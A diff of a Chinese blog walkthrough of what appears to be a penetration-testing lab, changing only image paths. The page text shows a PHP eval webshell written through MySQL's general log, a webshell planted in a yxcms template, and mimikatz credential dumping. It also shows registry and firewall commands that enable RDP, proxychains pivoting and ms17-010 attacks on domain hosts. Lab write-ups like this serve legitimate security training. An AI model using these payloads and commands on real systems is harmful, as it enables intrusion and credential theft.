@@ -373,7 +373,7 @@
 <hr>
 <h3 id="3打点">3.打点
 </h3><p>端口扫描发现80站点和3306mysql服务</p>
-<p><img src="/static/img/image-20241208142541944.png"
+<p><img src="/img/image-20241208142541944.png"
 	
 	
 	
@@ -384,7 +384,7 @@
 	
 ></p>
 <p>访问http发现phpstudy探针</p>
-<p><img src="/static/img/image-20241208142628629.png"
+<p><img src="/img/image-20241208142628629.png"
 	
 	
 	
@@ -395,7 +395,7 @@
 	
 ></p>
 <p>使用hydra发现无法连接</p>
-<p><img src="/static/img/image-20241208142912387.png"
+<p><img src="/img/image-20241208142912387.png"
 	
 	
 	
@@ -406,7 +406,7 @@
 	
 ></p>
 <p>截包尝试爆破发现一个异常长度</p>
-<p><img src="/static/img/image-20241208143525512.png"
+<p><img src="/img/image-20241208143525512.png"
 	
 	
 	
@@ -417,7 +417,7 @@
 	
 ></p>
 <p>返回包看不出什么,到web界面手动输入root,root发现连接正常说明存在弱口令root/root</p>
-<p><img src="/static/img/image-20241208143542310.png"
+<p><img src="/img/image-20241208143542310.png"
 	
 	
 	
@@ -428,7 +428,7 @@
 	
 ></p>
 <p>尝试连接发现不允许从外部连接</p>
-<p><img src="/static/img/image-20241208143801745.png"
+<p><img src="/img/image-20241208143801745.png"
 	
 	
 	
@@ -439,7 +439,7 @@
 	
 ></p>
 <p>掏出82年的笔记,按理说phpstudy搭建应该有phpadmin</p>
-<p><img src="/static/img/image-20241208143857821.png"
+<p><img src="/img/image-20241208143857821.png"
 	
 	
 	
@@ -450,7 +450,7 @@
 	
 ></p>
 <p>访问路径发现的确存在</p>
-<p><img src="/static/img/image-20241208143958943.png"
+<p><img src="/img/image-20241208143958943.png"
 	
 	
 	
@@ -461,7 +461,7 @@
 	
 ></p>
 <p>使用弱口令root/root成功进入</p>
-<p><img src="/static/img/image-20241208144044408.png"
+<p><img src="/img/image-20241208144044408.png"
 	
 	
 	
@@ -472,7 +472,7 @@
 	
 ></p>
 <p>发现是能够执行sql语句的</p>
-<p><img src="/static/img/image-20241208144514164.png"
+<p><img src="/img/image-20241208144514164.png"
 	
 	
 	
@@ -506,7 +506,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>查询&quot;secure_file_priv&quot;</p>
-<p><img src="/static/img/image-20241208144950595.png"
+<p><img src="/img/image-20241208144950595.png"
 	
 	
 	
@@ -517,7 +517,7 @@
 	
 ></p>
 <p>发现为null就是没有写入权限</p>
-<p><img src="/static/img/image-20241208145019777.png"
+<p><img src="/img/image-20241208145019777.png"
 	
 	
 	
@@ -528,7 +528,7 @@
 	
 ></p>
 <p>查询一下日志功能,尝试利用日志getshell</p>
-<p><img src="/static/img/image-20241208151454482.png"
+<p><img src="/img/image-20241208151454482.png"
 	
 	
 	
@@ -539,7 +539,7 @@
 	
 ></p>
 <p>关闭了但是我们可以手动开启,输入sql语句<code>SET GLOBAL general_log = ON;</code>执行成功开启</p>
-<p><img src="/static/img/image-20241208151634306.png"
+<p><img src="/img/image-20241208151634306.png"
 	
 	
 	
@@ -550,7 +550,7 @@
 	
 ></p>
 <p>我这里偷窥了一下站点目录,这个应该记住!</p>
-<p><img src="/static/img/image-20241208151917953.png"
+<p><img src="/img/image-20241208151917953.png"
 	
 	
 	
@@ -561,7 +561,7 @@
 	
 ></p>
 <p>接下来的思路是设置日志文件写到一个php文件中,<code>SET GLOBAL general_log_file = 'C:/phpstudy/WWW/test.php';</code></p>
-<p><img src="/static/img/image-20241208160931473.png"
+<p><img src="/img/image-20241208160931473.png"
 	
 	
 	
@@ -581,7 +581,7 @@
 </span></span><span class="line"><span class="cl">select &#39;&lt;?php eval($_POST[gucheng]);?&gt;&#39;;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/static/img/image-20241208161435113.png"
+</div><p><img src="/img/image-20241208161435113.png"
 	
 	
 	
@@ -591,7 +591,7 @@
 	
 	
 ></p>
-<p><img src="/static/img/image-20241208162418255.png"
+<p><img src="/img/image-20241208162418255.png"
 	
 	
 	
@@ -602,7 +602,7 @@
 	
 ></p>
 <p>进来后发现还有个网站yxcms,我们练习都打一下</p>
-<p><img src="/static/img/image-20241208164539137.png"
+<p><img src="/img/image-20241208164539137.png"
 	
 	
 	
@@ -613,7 +613,7 @@
 	
 ></p>
 <p>棱洞扫了下发现这cms就叫这个</p>
-<p><img src="/static/img/image-20241208165056769.png"
+<p><img src="/img/image-20241208165056769.png"
 	
 	
 	
@@ -624,7 +624,7 @@
 	
 ></p>
 <p>查看网页源代码发现默认口令</p>
-<p><img src="/static/img/image-20241208165525343.png"
+<p><img src="/img/image-20241208165525343.png"
 	
 	
 	
@@ -635,7 +635,7 @@
 	
 ></p>
 <p>到指定路径输入默认口令成功登入,修改模版index_index.php</p>
-<p><img src="/static/img/image-20241208170152404.png"
+<p><img src="/img/image-20241208170152404.png"
 	
 	
 	
@@ -646,7 +646,7 @@
 	
 ></p>
 <p>写入一句马</p>
-<p><img src="/static/img/image-20241208170701742.png"
+<p><img src="/img/image-20241208170701742.png"
 	
 	
 	
@@ -657,7 +657,7 @@
 	
 ></p>
 <p>蚁剑成功连接</p>
-<p><img src="/static/img/image-20241208170809940.png"
+<p><img src="/img/image-20241208170809940.png"
 	
 	
 	
@@ -671,7 +671,7 @@
 <h3 id="4内网渗透">4.内网渗透
 </h3><p>之前一直内网手渗透,下面就用cs操作了,主要是内网信息收集插件方便点</p>
 <p>将生成马上传到站点目录下运行上线</p>
-<p><img src="/static/img/image-20241208184123955.png"
+<p><img src="/img/image-20241208184123955.png"
 	
 	
 	
@@ -682,7 +682,7 @@
 	
 ></p>
 <p>ladon插件 icmp检测主机存活一致</p>
-<p><img src="/static/img/image-20241208185403956.png"
+<p><img src="/img/image-20241208185403956.png"
 	
 	
 	
@@ -693,7 +693,7 @@
 	
 ></p>
 <p>发现存在域环境,域名为god.org</p>
-<p><img src="/static/img/image-20241208193501834.png"
+<p><img src="/img/image-20241208193501834.png"
 	
 	
 	
@@ -704,7 +704,7 @@
 	
 ></p>
 <p>ladon infoscan整个网段确实如此</p>
-<p><img src="/static/img/image-20241208193607344.png"
+<p><img src="/img/image-20241208193607344.png"
 	
 	
 	
@@ -715,7 +715,7 @@
 	
 ></p>
 <p>现在是administrator权限,可以尝试提到system权限</p>
-<p><img src="/static/img/image-20241208194301195.png"
+<p><img src="/img/image-20241208194301195.png"
 	
 	
 	
@@ -726,7 +726,7 @@
 	
 ></p>
 <p>上传个nc到c:\windows\temp目录</p>
-<p><img src="/static/img/image-20241208194237316.png"
+<p><img src="/img/image-20241208194237316.png"
 	
 	
 	
@@ -737,7 +737,7 @@
 	
 ></p>
 <p>弹过来没反应</p>
-<p><img src="/static/img/image-20241208200518356.png"
+<p><img src="/img/image-20241208200518356.png"
 	
 	
 	
@@ -748,7 +748,7 @@
 	
 ></p>
 <p>mimikatz抓取到密码</p>
-<p><img src="/static/img/image-20241208200318243.png"
+<p><img src="/img/image-20241208200318243.png"
 	
 	
 	
@@ -759,7 +759,7 @@
 	
 ></p>
 <p>尝试用psexec连接也不行</p>
-<p><img src="/static/img/image-20241208202630995.png"
+<p><img src="/img/image-20241208202630995.png"
 	
 	
 	
@@ -770,7 +770,7 @@
 	
 ></p>
 <p>查看一下系统信息,打了什么补丁</p>
-<p><img src="/static/img/image-20241208202537197.png"
+<p><img src="/img/image-20241208202537197.png"
 	
 	
 	
@@ -781,7 +781,7 @@
 	
 ></p>
 <p>使用梼杌中的ms14-058提权成功</p>
-<p><img src="/static/img/image-20241208204847821.png"
+<p><img src="/img/image-20241208204847821.png"
 	
 	
 	
@@ -791,7 +791,7 @@
 	
 	
 ></p>
-<p><img src="/static/img/image-20241208202805154.png"
+<p><img src="/img/image-20241208202805154.png"
 	
 	
 	
@@ -803,7 +803,7 @@
 ></p>
 <p>上面搞的好像是有点问题,Windows应该是3389远程桌面连接,重新搞下</p>
 <p>执行netstat -ano未发现3389端口开启</p>
-<p><img src="/static/img/image-20241209133742373.png"
+<p><img src="/img/image-20241209133742373.png"
 	
 	
 	
@@ -832,7 +832,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>为1关闭</p>
-<p><img src="/static/img/image-20241209135458399.png"
+<p><img src="/img/image-20241209135458399.png"
 	
 	
 	
@@ -844,7 +844,7 @@
 ></p>
 <p>使用命令<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>手动开启</p>
 <p>为0成功开启</p>
-<p><img src="/static/img/image-20241209135700721.png"
+<p><img src="/img/image-20241209135700721.png"
 	
 	
 	
@@ -863,7 +863,7 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh advfirewall firewall add rule name=&#34;Remote Desktop&#34; protocol=TCP dir=in localport=3389 action=allow
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/static/img/image-20241209141144583.png"
+</div><p><img src="/img/image-20241209141144583.png"
 	
 	
 	
@@ -884,7 +884,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>传上去执行后拿到meterpreter会话</p>
-<p><img src="/static/img/image-20241209143251537.png"
+<p><img src="/img/image-20241209143251537.png"
 	
 	
 	
@@ -894,7 +894,7 @@
 	
 	
 ></p>
-<p><img src="/static/img/image-20241209143532781.png"
+<p><img src="/img/image-20241209143532781.png"
 	
 	
 	
@@ -905,7 +905,7 @@
 	
 ></p>
 <p>提权到system</p>
-<p><img src="/static/img/image-20241209143942740.png"
+<p><img src="/img/image-20241209143942740.png"
 	
 	
 	
@@ -929,7 +929,7 @@
 </div>
 </div><p>接下来做域内信息收集准备横向</p>
 <p>输入net view发现另外两台主机</p>
-<p><img src="/static/img/image-20241209132456126.png"
+<p><img src="/img/image-20241209132456126.png"
 	
 	
 	
@@ -939,7 +939,7 @@
 	
 	
 ></p>
-<p><img src="/static/img/image-20241209153323049.png"
+<p><img src="/img/image-20241209153323049.png"
 	
 	
 	
@@ -978,7 +978,7 @@
 </div>
 </div><h4 id="41-使用proxychains代理">4.1 使用proxychains代理:
 </h4><p>添加内网路由 run autoroute -s 192.168.52.0/24，查看一下arp缓存表存在52网段</p>
-<p><img src="/static/img/image-20241209154407675.png"
+<p><img src="/img/image-20241209154407675.png"
 	
 	
 	
@@ -1012,7 +1012,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>重新开个终端vim /etc/proxychains.conf,如下配置</p>
-<p><img src="/static/img/image-20241209162027957.png"
+<p><img src="/img/image-20241209162027957.png"
 	
 	
 	
@@ -1023,7 +1023,7 @@
 	
 ></p>
 <p>返回msf6,输入<code>proxychains curl http://192.168.52.143/yxcms/index.php</code>,测试可以成功访问192.168.52.0网段</p>
-<p><img src="/static/img/image-20241209162205894.png"
+<p><img src="/img/image-20241209162205894.png"
 	
 	
 	
@@ -1035,7 +1035,7 @@
 ></p>
 <h4 id="42-cs直接建立socks5代理">4.2 CS直接建立socks5代理
 </h4><p>右键点击机器-&gt;代理转发-&gt;socks代理,发现是62549端口</p>
-<p><img src="/static/img/image-20241209162347235.png"
+<p><img src="/img/image-20241209162347235.png"
 	
 	
 	
@@ -1046,7 +1046,7 @@
 	
 ></p>
 <p>proxifier检测成功,还是这个更方便点</p>
-<p><img src="/static/img/image-20241209162500913.png"
+<p><img src="/img/image-20241209162500913.png"
 	
 	
 	
@@ -1057,7 +1057,7 @@
 	
 ></p>
 <p>再在代理规则选择刚才那个即可</p>
-<p><img src="/static/img/image-20241209163321746.png"
+<p><img src="/img/image-20241209163321746.png"
 	
 	
 	
@@ -1067,7 +1067,7 @@
 	
 	
 ></p>
-<p><img src="/static/img/image-20241209163352580.png"
+<p><img src="/img/image-20241209163352580.png"
 	
 	
 	
@@ -1079,7 +1079,7 @@
 ></p>
 <h4 id="43-渗透同域主机19216852141">4.3 渗透同域主机192.168.52.141
 </h4><p><code>proxychains nmap -Pn 192.168.52.141</code></p>
-<p><img src="/static/img/image-20241209164251738.png"
+<p><img src="/img/image-20241209164251738.png"
 	
 	
 	
@@ -1090,7 +1090,7 @@
 	
 ></p>
 <p>通过445smb端口检测操作系统为Windows server2003,<code>proxychains nmap -sV 192.168.52.141 -p 445</code></p>
-<p><img src="/static/img/image-20241209164513076.png"
+<p><img src="/img/image-20241209164513076.png"
 	
 	
 	
@@ -1101,7 +1101,7 @@
 	
 ></p>
 <p>搜了一下2003全是永恒之蓝</p>
-<p><img src="/static/img/image-20241209165028841.png"
+<p><img src="/img/image-20241209165028841.png"
 	
 	
 	
@@ -1112,7 +1112,7 @@
 	
 ></p>
 <p>先用第三个模块检测一下</p>
-<p><img src="/static/img/image-20241209170232546.png"
+<p><img src="/img/image-20241209170232546.png"
 	
 	
 	
@@ -1123,7 +1123,7 @@
 	
 ></p>
 <p>直接使用msf里面的攻击模块了(ms17-010)发现接收不了session,使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell。</p>
-<p><img src="/static/img/image-20241209165759224.png"
+<p><img src="/img/image-20241209165759224.png"
 	
 	
 	
@@ -1135,7 +1135,7 @@
 ></p>
 <p>换用这个代码执行试试<code>use auxiliary/admin/smb/ms17_010_command</code></p>
 <p>代码成功运行</p>
-<p><img src="/static/img/image-20241209170439287.png"
+<p><img src="/img/image-20241209170439287.png"
 	
 	
 	
@@ -1165,7 +1165,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>使用rdesktop连接<code>proxychains rdesktop 192.168.52.141</code></p>
-<p><img src="/static/img/image-20241209171859855.png"
+<p><img src="/img/image-20241209171859855.png"
 	
 	
 	
@@ -1176,7 +1176,7 @@
 	
 ></p>
 <p>连接成功</p>
-<p><img src="/static/img/image-20241209171919145.png"
+<p><img src="/img/image-20241209171919145.png"
 	
 	
 	
@@ -1189,7 +1189,7 @@
 <p>msf设置正反向shell都打不通不知道为啥,登个远程桌面算了</p>
 <h4 id="44-打域控">4.4 打域控
 </h4><p>扫描端口,发现445又开启了</p>
-<p><img src="/static/img/image-20241209182152367.png"
+<p><img src="/img/image-20241209182152367.png"
 	
 	
 	
@@ -1223,7 +1223,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>创建成功</p>
-<p><img src="/static/img/image-20241209180926400.png"
+<p><img src="/img/image-20241209180926400.png"
 	
 	
 	
@@ -1234,7 +1234,7 @@
 	
 ></p>
 <p><code>proxychains rdesktop 192.168.52.138</code> 发现连接不了,端口filtered,裂开,这个msf的模块打不通不知道啥原因,以后再研究艹</p>
-<p><img src="/static/img/image-20241209183526997.png"
+<p><img src="/img/image-20241209183526997.png"
 	
 	
 	
